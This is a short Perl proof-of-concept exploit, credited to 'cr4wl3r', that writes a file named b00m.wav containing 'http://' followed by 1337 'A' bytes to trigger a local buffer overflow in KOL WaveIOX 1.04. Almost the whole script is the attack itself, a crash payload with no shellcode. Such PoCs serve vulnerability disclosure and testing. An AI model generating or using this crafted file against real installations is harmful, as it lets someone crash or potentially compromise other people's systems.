#!/usr/bin/perl
#########################################################
## Usage-->>file created-->>load file-->>b00m.wav >>>BOOM
#########################################################


print "#####################################################\n";
print "[!] KOL WaveIOX 1.04 (.wav) Local Buffer Overflow PoC\n";
print "\n";
print "[!] Author: cr4wl3r\n";
print "[!] Mail: cr4wl3r[!]linuxmail.org\n";
print "#####################################################\n";


my $boom = "http://"."\x41" x 1337;
my $filename = "b00m.wav";
open (FILE,">$filename");
print FILE "$boom";
print "\nFile successfully created!\n";